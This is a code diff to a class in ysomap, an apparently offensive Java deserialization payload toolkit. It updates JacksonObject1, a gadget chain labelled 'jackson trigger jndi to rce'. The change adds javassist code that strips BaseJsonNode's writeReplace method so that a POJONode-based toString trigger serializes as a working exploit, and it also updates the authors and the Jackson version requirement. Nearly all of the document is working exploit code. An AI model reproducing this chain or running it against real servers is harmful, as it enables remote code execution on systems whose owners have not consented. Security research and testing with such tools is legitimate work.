@@ -10,14 +10,14 @@ import ysomap.payloads.AbstractPayload;
 /**
  * @author whocansee
  * @since 2023/10/7
- * https://xz.aliyun.com/t/12846
+ * <a href="https://xz.aliyun.com/t/12846">...</a>
  */
 @Payloads
 @SuppressWarnings({"rawtypes"})
-@Authors({ Authors.whocansee })
+@Authors({ Authors.whocansee, Authors.TYSKILL })
 @Targets({Targets.JDK})
 @Require(bullets = {"LdapAttributeBullet"}, param = false)
-@Dependencies({"jackson"})
+@Dependencies({"jackson>=2.10.0"})
 @Details("jackson trigger jndi to rce")
 public class JacksonObject1 extends AbstractPayload<Object> {
 
@@ -28,6 +28,12 @@ public class JacksonObject1 extends AbstractPayload<Object> {
 
     @Override
     public Object pack(Object obj) throws Exception {
+        javassist.ClassPool pool = javassist.ClassPool.getDefault();
+        javassist.CtClass ctClass = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        javassist.CtMethod ctMethod = ctClass.getDeclaredMethod("writeReplace");
+        ctClass.removeMethod(ctMethod);
+        ctClass.toClass(); // 覆盖对象
+
         POJONode node = new POJONode(obj);
         return PayloadHelper.makeReadObjectToStringTrigger(node);
     }
